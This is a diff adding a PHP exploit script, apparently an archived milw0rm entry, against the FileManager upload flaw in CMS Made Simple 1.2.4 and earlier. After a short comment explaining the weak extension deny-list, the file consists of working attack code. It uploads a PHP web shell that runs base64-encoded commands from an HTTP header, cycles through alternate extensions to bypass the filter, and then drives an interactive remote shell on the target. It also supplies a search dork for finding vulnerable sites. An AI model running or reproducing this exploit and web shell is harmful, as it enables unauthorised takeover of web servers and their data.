@@ -1,0 +1,157 @@
+<?php
+
+/*
+	---------------------------------------------------------------------------
+	CMS Made Simple <= 1.2.4 (FileManager module) Arbitrary File Upload Exploit
+	---------------------------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://www.cmsmadesimple.org/
+	dork.....: "This site is powered by CMS Made Simple"
+
+	[-] vulnerable code in /modules/FileManager/postlet/javaUpload.php
+	
+	21.	// Configuration ---------------------------------------------------------------
+	22.	// Change the below path to the folder where you would like files uploading.
+	23.	// e.g. "/home/yourname/myuploads/"
+	24.	// or "c:\php\uploads\"
+	25.	// Note, this MUST have the trailing slash.
+	26.	$uploaddir = '[PATH TO UPLOAD DIRECTORY]';
+	27.	// Whether or not to allow the upload of specific files
+	28.	$allow_or_deny = true;
+	29.	// If the above is true, then this states whether the array of files is a list of
+	30.	// extensions to ALLOW, or DENY
+	31.	$allow_or_deny_method = "deny"; // "allow" or "deny"
+	32.	$file_extension_list = array("php","asp","pl");
+	33.	// -----------------------------------------------------------------------------
+	34.	if ($allow_or_deny){
+	35.		if (($allow_or_deny_method == "allow" && !in_array(strtolower(array_pop(explode('.', $_FILES['userfile']['name']))), $file_extension_list))
+	36.			|| ($allow_or_deny_method == "deny" && in_array(strtolower(array_pop(explode('.', $_FILES['userfile']['name']))), $file_extension_list))){		
+	37.			// Atempt to upload a file with a specific extension when NOT allowed.
+	38.			// 403 error
+	39.			header("HTTP/1.1 403 Forbidden");
+	40.			echo "POSTLET REPLY\r\n";
+	41.			echo "POSTLET:NO\r\n";
+	42.			echo "POSTLET:FILE TYPE NOT ALLOWED\r\n";
+	43.			echo "POSTLET:ABORT THIS\r\n"; // Postlet should NOT send this file again.
+	44.			echo "END POSTLET REPLY\r\n";
+	45.			exit;
+	46.		}
+	47.	}
+	48.	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir .$_FILES['userfile']['name']))
+	49.	{
+	50.		// All replies MUST start with "POSTLET REPLY", if they don't, then Postlet will
+	51.		// not read the reply and will assume the file uploaded successfully.
+	52.		echo "POSTLET REPLY\r\n";
+	53.		// "YES" tells Postlet that this file was successfully uploaded.
+	54.	    	echo "POSTLET:YES\r\n";
+	55.		// End the Postlet reply
+	56.		echo "END POSTLET REPLY\r\n";
+	57.		exit;
+	
+	with a default configuration of this script, an attacker might be able to upload arbitrary files containing malicious
+	PHP code due to $file_extension_list array don't contains many dangerous extensions (.jsp, .php3, .cgi, .dhtml, etc...)
+	
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+	$sock = fsockopen($host, 80);
+	while (!$sock)
+	{
+		print "\n[-] No response from {$host}:80 Trying again...";
+		$sock = fsockopen($host, 80);
+	}
+	fputs($sock, $packet);
+	while (!feof($sock)) $resp .= fread($sock, 1024);
+	fclose($sock);
+	return $resp;
+}
+
+function upload()
+{
+	global $host, $path, $uploaddir, $file_ext;
+	
+	foreach ($file_ext as $ext)
+	{
+		print "\n[-] Trying to upload with .{$ext} extension...";
+		
+		$data  = "--12345\r\n";
+		$data .= "Content-Disposition: form-data; name=\"userfile\"; filename=\".php.{$ext}\"\r\n";
+		$data .= "Content-Type: application/octet-stream\r\n\r\n";
+		$data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\n";
+		$data .= "--12345--\r\n";
+		
+		$packet  = "POST {$path}modules/FileManager/postlet/javaUpload.php HTTP/1.0\r\n";
+		$packet .= "Host: {$host}\r\n";
+		$packet .= "Content-Length: ".strlen($data)."\r\n";
+		$packet .= "Content-Type: multipart/form-data; boundary=12345\r\n";
+		$packet .= "Connection: close\r\n\r\n";
+		$packet .= $data;
+		$html	 = http_send($host, $packet);
+		
+		if (!eregi("POSTLET:YES", $html)) die("\n[-] Upload failed!\n");
+		
+		$packet  = "GET {$path}modules/FileManager/postlet/{$uploaddir}.php.{$ext} HTTP/1.0\r\n";
+		$packet .= "Host: {$host}\r\n";
+		$packet .= "Connection: close\r\n\r\n";
+		$html    = http_send($host, $packet);
+		
+		if (!eregi("print", $html) and eregi("_code_", $html)) return $ext;
+		
+		sleep(1);
+	}
+	
+	return false;
+}
+
+print "\n+----------------------------------------------------------------+";
+print "\n| CMS Made Simple <= 1.2.4 Arbitrary File Upload Exploit by EgiX |";
+print "\n+----------------------------------------------------------------+\n";
+
+if ($argc < 2)
+{
+	print "\nUsage......: php $argv[0] host path";
+	print "\nExample....: php $argv[0] localhost /cms/\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$uploaddir = rawurlencode("[PATH TO UPLOAD DIRECTORY]");
+$file_ext  = array("dhtml", "phtml", "php3", "php5", "jsp", "jar", "cgi");
+
+if (!($ext = upload())) die("\n\n[-] Exploit failed...\n");
+else print "\n[-] Shell uploaded...starting it!\n";
+
+define(STDIN, fopen("php://stdin", "r"));
+
+while(1)
+{
+	print "\ncmsmadesimple-shell# ";
+	$cmd = trim(fgets(STDIN));
+	if ($cmd != "exit")
+	{
+		$packet = "GET {$path}modules/FileManager/postlet/{$uploaddir}.php.{$ext} HTTP/1.0\r\n";
+		$packet.= "Host: {$host}\r\n";
+		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
+		$packet.= "Connection: close\r\n\r\n";
+		$html   = http_send($host, $packet);
+		//echo $html;
+		if (!eregi("_code_", $html)) die("\n[-] Exploit failed...\n");
+		$shell = explode("_code_", $html);
+		print "\n{$shell[1]}";
+	}
+	else break;
+}
+
+?>
+
+# milw0rm.com [2008-05-12]
